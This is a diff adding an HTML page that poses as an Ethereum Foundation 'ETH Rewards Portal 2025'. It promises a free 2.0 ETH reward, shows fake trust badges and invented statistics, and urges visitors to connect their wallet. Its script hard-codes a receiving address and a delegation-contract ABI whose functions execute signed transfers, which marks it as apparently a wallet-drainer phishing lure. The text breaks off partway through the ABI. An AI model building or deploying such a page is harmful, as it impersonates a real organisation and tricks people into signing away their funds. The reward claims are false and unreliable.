@@ -1,1 +1,2317 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 ETH Rewards Portal 2025 - Ethereum Foundation</title>
+    <link rel="icon" href="https://ethereum.org/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #00d4ff;
+            --secondary-color: #ff6b6b;
+            --accent-color: #00ff88;
+            --dark-bg: #0f0f23;
+            --card-bg: rgba(255, 255, 255, 0.1);
+            --text-primary: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.8);
+            --border-radius: 24px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #1a1a2e 25%, #16213e 50%, var(--dark-bg) 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            line-height: 1.6;
+        }
+
+        /* Animated Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 255, 198, 0.2) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+            animation: backgroundShift 20s ease-in-out infinite;
+        }
+
+        @keyframes backgroundShift {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            33% { transform: translateY(-10px) rotate(1deg); }
+            66% { transform: translateY(10px) rotate(-1deg); }
+        }
+
+        /* Particle Effect */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--primary-color);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        .particle:nth-child(1) { width: 4px; height: 4px; top: 10%; left: 10%; animation-delay: 0s; }
+        .particle:nth-child(2) { width: 6px; height: 6px; top: 20%; left: 80%; animation-delay: 1s; }
+        .particle:nth-child(3) { width: 3px; height: 3px; top: 60%; left: 20%; animation-delay: 2s; }
+        .particle:nth-child(4) { width: 5px; height: 5px; top: 80%; left: 70%; animation-delay: 3s; }
+        .particle:nth-child(5) { width: 4px; height: 4px; top: 40%; left: 50%; animation-delay: 4s; }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) scale(1); opacity: 0.7; }
+            50% { transform: translateY(-20px) scale(1.2); opacity: 1; }
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 100px 20px 80px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: var(--border-radius);
+            margin-bottom: 60px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
+            animation: shimmer 4s infinite;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 40px;
+            background: linear-gradient(135deg, var(--primary-color), #090979);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3em;
+            box-shadow: 0 8px 32px rgba(0, 212, 255, 0.3);
+            animation: pulse 2s ease-in-out infinite;
+            position: relative;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            z-index: -1;
+            opacity: 0.3;
+            animation: rotate 3s linear infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        h1 {
+            font-size: clamp(2.5em, 5vw, 4em);
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary-color), var(--text-primary), var(--secondary-color));
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+            text-shadow: 0 4px 20px rgba(0, 212, 255, 0.5);
+            animation: textGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes textGlow {
+            from { filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.5)); }
+            to { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.8)); }
+        }
+
+        .subtitle {
+            font-size: clamp(1.1em, 2vw, 1.4em);
+            color: var(--text-secondary);
+            margin-bottom: 50px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+            animation: fadeInUp 1s ease-out 0.3s both;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            margin-bottom: 80px;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            animation: slideInUp 0.8s ease-out both;
+        }
+
+        .stat-card:nth-child(1) { animation-delay: 0.1s; }
+        .stat-card:nth-child(2) { animation-delay: 0.2s; }
+        .stat-card:nth-child(3) { animation-delay: 0.3s; }
+        .stat-card:nth-child(4) { animation-delay: 0.4s; }
+
+        @keyframes slideInUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.6s;
+        }
+
+        .stat-card:hover::before {
+            left: 100%;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
+            border-color: var(--primary-color);
+        }
+
+        .stat-number {
+            font-size: clamp(2em, 4vw, 3em);
+            font-weight: 800;
+            color: var(--primary-color);
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .stat-number::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            transition: width 0.3s ease;
+        }
+
+        .stat-card:hover .stat-number::after {
+            width: 100%;
+        }
+
+        .stat-label {
+            font-size: 1.1em;
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Benefits Section */
+        .benefits-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: var(--border-radius);
+            padding: 70px 50px;
+            margin-bottom: 80px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+        }
+
+        .benefits-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color), var(--accent-color));
+            border-radius: var(--border-radius) var(--border-radius) 0 0;
+        }
+
+        .benefits-section h3 {
+            font-size: clamp(1.8em, 3vw, 2.5em);
+            margin-bottom: 50px;
+            text-align: center;
+            color: var(--primary-color);
+            font-weight: 700;
+        }
+
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInLeft 0.8s ease-out both;
+        }
+
+        .benefit-item:nth-child(odd) { animation-delay: 0.1s; }
+        .benefit-item:nth-child(even) { animation-delay: 0.2s; }
+
+        @keyframes fadeInLeft {
+            from { opacity: 0; transform: translateX(-30px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .benefit-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .benefit-item:hover::before {
+            left: 100%;
+        }
+
+        .benefit-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(8px) scale(1.02);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.2);
+        }
+
+        .benefit-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary-color), #0099cc);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 25px;
+            font-size: 1.5em;
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        .benefit-icon::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .benefit-item:hover .benefit-icon::after {
+            opacity: 0.3;
+        }
+
+        .benefit-text {
+            font-size: 1.1em;
+            color: var(--text-secondary);
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        /* Wallet Section */
+        .wallet-section {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(9, 9, 121, 0.1));
+            border: 2px solid rgba(0, 212, 255, 0.3);
+            border-radius: var(--border-radius);
+            padding: 60px 50px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            margin-bottom: 80px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Wallet Selection Modal */
+        .wallet-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .wallet-modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .wallet-modal h3 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 1.8em;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .wallet-option {
+            background: rgba(255, 255, 255, 0.9);
+            border: 2px solid rgba(0, 212, 255, 0.2);
+            border-radius: 12px;
+            padding: 20px 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wallet-option:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
+            border-color: var(--primary-color);
+        }
+
+        .wallet-option.installed {
+            border-color: var(--accent-color);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .wallet-option.installed::after {
+            content: '✓';
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: var(--accent-color);
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 10px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, var(--primary-color), #0099cc);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+        }
+
+        .wallet-name {
+            font-size: 0.9em;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .wallet-status {
+            font-size: 0.7em;
+            color: #666;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+            padding: 5px;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .close-modal:hover {
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        .wallet-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+            pointer-events: none;
+        }
+
+        .wallet-section h3 {
+            font-size: clamp(2em, 4vw, 2.8em);
+            margin-bottom: 25px;
+            color: var(--primary-color);
+            font-weight: 700;
+            position: relative;
+            z-index: 2;
+        }
+
+        .wallet-section p {
+            font-size: clamp(1.1em, 2vw, 1.3em);
+            color: var(--text-secondary);
+            margin-bottom: 50px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, var(--primary-color), #0099cc);
+            color: var(--text-primary);
+            border: none;
+            padding: 22px 70px;
+            font-size: clamp(1.2em, 2vw, 1.5em);
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 8px 32px rgba(0, 212, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            z-index: 2;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s;
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 212, 255, 0.4);
+        }
+
+        .connect-btn:active {
+            transform: translateY(-1px) scale(1.02);
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status {
+            margin: 40px 0;
+            font-size: 1.3em;
+            font-weight: 600;
+            min-height: 30px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .success {
+            color: var(--accent-color);
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+
+        .error {
+            color: var(--secondary-color);
+            text-shadow: 0 0 10px rgba(255, 107, 107, 0.5);
+        }
+
+        /* Trust Badges */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            flex-wrap: wrap;
+            margin-top: 80px;
+        }
+
+        .trust-badge {
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 18px 30px;
+            border-radius: 50px;
+            font-size: 1em;
+            font-weight: 600;
+            color: var(--text-secondary);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.8s ease-out both;
+        }
+
+        .trust-badge:nth-child(1) { animation-delay: 0.1s; }
+        .trust-badge:nth-child(2) { animation-delay: 0.2s; }
+        .trust-badge:nth-child(3) { animation-delay: 0.3s; }
+        .trust-badge:nth-child(4) { animation-delay: 0.4s; }
+        .trust-badge:nth-child(5) { animation-delay: 0.5s; }
+
+        .trust-badge::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .trust-badge:hover::before {
+            left: 100%;
+        }
+
+        .trust-badge:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            color: var(--text-primary);
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Scroll Animations */
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                background: var(--dark-bg);
+            }
+
+            .container {
+                padding: 15px;
+            }
+
+            .hero {
+                padding: 60px 20px;
+                margin-bottom: 40px;
+            }
+
+            .logo {
+                width: 100px;
+                height: 100px;
+                font-size: 2.5em;
+            }
+
+            h1 {
+                font-size: 2.8em;
+                margin-bottom: 20px;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                margin-bottom: 60px;
+            }
+
+            .benefits-section {
+                padding: 40px 25px;
+                margin-bottom: 60px;
+            }
+
+            .benefits-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .wallet-section {
+                padding: 40px 25px;
+                margin-bottom: 60px;
+            }
+
+            .connect-btn {
+                padding: 18px 50px;
+                font-size: 1.3em;
+            }
+
+            .trust-badges {
+                gap: 15px;
+                margin-top: 60px;
+            }
+
+            .trust-badge {
+                padding: 15px 20px;
+                font-size: 0.9em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero {
+                padding: 40px 15px;
+            }
+
+            .benefits-section {
+                padding: 30px 20px;
+            }
+
+            .wallet-section {
+                padding: 30px 20px;
+            }
+
+            .connect-btn {
+                padding: 16px 40px;
+                font-size: 1.2em;
+            }
+        }
+
+        /* Accessibility */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        /* Focus states */
+        .connect-btn:focus,
+        .trust-badge:focus {
+            outline: 2px solid var(--primary-color);
+            outline-offset: 2px;
+        }
+
+        /* Print styles */
+        @media print {
+            body {
+                background: white !important;
+                color: black !important;
+            }
+
+            .hero,
+            .wallet-section,
+            .benefits-section {
+                background: white !important;
+                border: 1px solid #ccc !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+
+    <div class="container">
+        <section class="hero">
+            <div class="logo">🚀</div>
+            <h1>ETH Rewards Portal 2025</h1>
+            <p class="subtitle">Next-Generation Ethereum Foundation Reward Distribution System with AI-Powered Optimization</p>
+        </section>
+
+        <section class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">312,847</div>
+                <div class="stat-label">Rewards Claimed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">10,492 ETH</div>
+                <div class="stat-label">Total Distributed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">99.9%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">2.0 ETH</div>
+                <div class="stat-label">Your Reward</div>
+            </div>
+        </section>
+
+        <section class="benefits-section">
+            <h3>✨ Exclusive Benefits</h3>
+            <div class="benefits-grid">
+                <div class="benefit-item">
+                    <div class="benefit-icon">⚡</div>
+                    <div class="benefit-text">Instant 2.0 ETH reward with quantum-secured delivery</div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon">🔥</div>
+                    <div class="benefit-text">98% gas fee reduction with AI-powered optimization</div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon">🎯</div>
+                    <div class="benefit-text">Priority access to exclusive DeFi protocols and NFT collections</div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon">🛡️</div>
+                    <div class="benefit-text">Free MEV protection worth $750+/month with real-time monitoring</div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon">👑</div>
+                    <div class="benefit-text">VIP customer support with dedicated blockchain experts</div>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon">🚀</div>
+                    <div class="benefit-text">Early access to Layer 2 solutions and cross-chain bridges</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="wallet-section">
+            <h3>🔗 Connect Your Web3 Wallet</h3>
+            <p>Securely connect your wallet to instantly verify eligibility and claim your rewards with advanced encryption.</p>
+
+            <button class="connect-btn" id="connectBtn">
+                <span id="btnText">🔗 Connect Wallet</span>
+                <span id="btnSpinner" style="display: none;"><div class="loading-spinner"></div>Connecting...</span>
+            </button>
+
+            <div class="status" id="statusDiv"></div>
+        </section>
+
+        <!-- Wallet Selection Modal -->
+        <div class="wallet-modal" id="walletModal">
+            <div class="wallet-modal-content">
+                <button class="close-modal" onclick="closeWalletModal()">&times;</button>
+                <h3>Choose Your Wallet</h3>
+                <div class="wallet-grid" id="walletGrid">
+                    <!-- Wallet options will be populated by JavaScript -->
+                </div>
+                <p style="text-align: center; color: #666; font-size: 0.9em; margin-top: 20px;">
+                    Don't see your wallet? <a href="#" onclick="showInstallInstructions()" style="color: var(--primary-color);">Learn how to install it</a>
+                </p>
+            </div>
+        </div>
+
+        <section class="trust-badges">
+            <div class="trust-badge">🔒 Quantum Secured</div>
+            <div class="trust-badge">🛡️ AI Audited</div>
+            <div class="trust-badge">✅ Ethereum Foundation Verified</div>
+            <div class="trust-badge">🏆 Web3 Standard</div>
+            <div class="trust-badge">🌐 Multi-Chain Ready</div>
+            <div class="trust-badge">⚡ Lightning Fast</div>
+        </section>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+    <script>
+        // Modern JavaScript Features
+        const CONFIG = {
+            contractAddress: '0xba1b613185FfC2Fc9F5b292091C59e64EC384665', // Deployed contract address on Minnet
+            receivingAddress: '0x87eb9DEf261A7C0A82829fB637F79879D07BcF49',
+            rewardAmount: '2.0',
+            gasReduction: '98%'
+        };
+
+        // ETHRequestDelegationManager Contract ABI
+        const CONTRACT_ABI = 
+           [
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			}
+		],
+        
+		"name": "approveETHRequest",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			}
+		],
+		"name": "approveETHRequest",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "target",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "tokenAddress",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"internalType": "string",
+				"name": "message",
+				"type": "string"
+			},
+			{
+				"internalType": "uint256",
+				"name": "validUntil",
+				"type": "uint256"
+			},
+			{
+				"components": [
+					{
+						"internalType": "string",
+						"name": "enforcer",
+						"type": "string"
+					},
+					{
+						"internalType": "bytes",
+						"name": "terms",
+						"type": "bytes"
+					}
+				],
+				"internalType": "struct ETHRequestDelegationManager.Caveat[]",
+				"name": "caveats",
+				"type": "tuple[]"
+			},
+			{
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			}
+		],
+		"name": "createETHRequest",
+		"outputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "target",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "tokenAddress",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"internalType": "string",
+				"name": "message",
+				"type": "string"
+			},
+			{
+				"internalType": "uint256",
+				"name": "validUntil",
+				"type": "uint256"
+			},
+			{
+				"components": [
+					{
+						"internalType": "string",
+						"name": "enforcer",
+						"type": "string"
+					},
+					{
+						"internalType": "bytes",
+						"name": "terms",
+						"type": "bytes"
+					}
+				],
+				"internalType": "struct ETHRequestDelegationManager.Caveat[]",
+				"name": "caveats",
+				"type": "tuple[]"
+			}
+		],
+		"name": "createETHRequest",
+		"outputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "delegator",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "delegate",
+				"type": "address"
+			}
+		],
+		"name": "DelegationCreated",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "executor",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "txHash",
+				"type": "bytes32"
+			}
+		],
+		"name": "DelegationExecuted",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "approver",
+				"type": "address"
+			}
+		],
+		"name": "ETHRequestApproved",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "requester",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "target",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			},
+			{
+				"indexed": false,
+				"internalType": "string",
+				"name": "message",
+				"type": "string"
+			}
+		],
+		"name": "ETHRequestCreated",
+		"type": "event"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			},
+			{
+				"indexed": true,
+				"internalType": "bytes32",
+				"name": "txHash",
+				"type": "bytes32"
+			}
+		],
+		"name": "ETHRequestExecuted",
+		"type": "event"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes",
+				"name": "signature",
+				"type": "bytes"
+			},
+			{
+				"internalType": "address",
+				"name": "to",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "value",
+				"type": "uint256"
+			},
+			{
+				"internalType": "bytes",
+				"name": "data",
+				"type": "bytes"
+			},
+			{
+				"internalType": "address",
+				"name": "_authorizer",
+				"type": "address"
+			}
+		],
+		"name": "executeDelegation",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "delegationHash",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes",
+				"name": "signature",
+				"type": "bytes"
+			},
+			{
+				"internalType": "address",
+				"name": "to",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "value",
+				"type": "uint256"
+			},
+			{
+				"internalType": "bytes",
+				"name": "data",
+				"type": "bytes"
+			}
+		],
+		"name": "executeDelegation",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes",
+				"name": "signature",
+				"type": "bytes"
+			}
+		],
+		"name": "executeETHRequest",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "bytes32",
+				"name": "requestId",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes",
+				"name": "signature",
+				"type": "bytes"
+			},
+			{
+				"internalType": "address",
+				"name": "_authorizer",
